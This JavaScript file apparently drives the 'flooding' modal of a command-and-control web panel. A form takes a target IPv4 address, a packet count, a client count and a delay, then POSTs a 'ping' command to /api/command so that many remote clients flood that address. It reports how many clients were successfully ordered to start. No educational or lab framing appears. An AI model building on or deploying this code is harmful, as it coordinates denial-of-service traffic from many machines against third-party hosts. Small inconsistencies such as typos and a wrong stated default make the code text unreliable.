// Dynamically load the modal
async function loadFloodingModal() {
    const response = await fetch('/static/html/partial.flooding-modal.html');
    if (response.ok) {
        const modalHtml = await response.text();
        document.getElementById('flooding-modal-section').innerHTML = modalHtml;

        // Initialize modal-related JavaScript after loading
        initializeFloodingModal();
    } else {
        console.error('Failed to load flooding modal:', response.status);
    }
}

// Initialize the command modal
function initializeFloodingModal() {
    const modal = document.getElementById('flooding-modal');
    const openModalButton = document.getElementById('open-flooding-modal');
    const closeButton = modal.querySelector('.close-button');
    const floodingForm = document.getElementById('flooding-form');
    const toggleOptionalButton = document.getElementById('toggle-optional');
    const optionalInputs = document.getElementById('optional-inputs');

    // Open and close modal
    openModalButton.addEventListener('click', () => {
        modal.style.display = 'block';
    });

    closeButton.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Toggle optional inputs
    toggleOptionalButton.addEventListener('click', () => {
        if (optionalInputs.style.display === 'none') {
            optionalInputs.style.display = 'block';
            toggleOptionalButton.textContent = '▲ Hide Optional Inputs';
        } else {
            optionalInputs.style.display = 'none';
            toggleOptionalButton.textContent = '▼ Show Optional Inputs';
        }
    });

    // Handle form submission
    floodingForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        const numClients = document.getElementById('num-clients-input').value.trim();
        const cmdId = document.getElementById('cmd-id-input').value.trim();
        const program = "ping";
        const ip = document.getElementById('ip-input').value.trim();
        const packetNumberInput = document.getElementById('packet-number-input').value.trim() || '1';
        const delay = document.getElementById('delay-input').value.trim() || '0';
        const expectedCode = document.getElementById('expected-code-input').value.trim() || '0';

        if (!ip) {
            showNotification('Please enter an IPv4 address.', 'error');
            return;
        }

        if (packetNumberInput <= 0 || isNaN(packetNumberInput)) {
            showNotification('Please enter a valid number of ICMP packets or let it blanck (default 0).', 'error');
            return;
        }

        const params = `${ip} -c ${packetNumberInput}`;

        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `num_clients=${encodeURIComponent(numClients)}&cmd_id=${encodeURIComponent(cmdId)}&program=${encodeURIComponent(program)}&params=${encodeURIComponent(params)}&delay=${encodeURIComponent(delay)}&expected_code=${encodeURIComponent(expectedCode)}`,
            });

            if (response.ok) {
                const result = await response.json();
                if ((result.status === "success") && (result.targeted_clients === 0)) {
                    showNotification(`Error beggining flood, no client successfully contacted: ${result.targeted_clients}`, 'error');
                } else {
                    showNotification(`Flodding started successfully! Successful recipients: ${result.targeted_clients}`, 'success');
                }
                
            } else {
                const error = await response.json();
                showNotification(`Error: ${error.message}`, 'error');
            }
        } catch (err) {
            showNotification(`Failed to begin flooding: ${err.message}`, 'error');
        }

        modal.style.display = 'none';
    });
}

// Call the function to load the command modal
loadFloodingModal();

document.addEventListener("DOMContentLoaded", () => {
    const openModalButton = document.getElementById('open-flooding-modal');
    if (openModalButton) {
        openModalButton.addEventListener('click', () => {
            const modal = document.getElementById('flooding-modal');
            if (modal) {
                modal.style.display = 'block';
            }
        });
    } else {
        console.error('Open flooding modal button not found.');
    }
});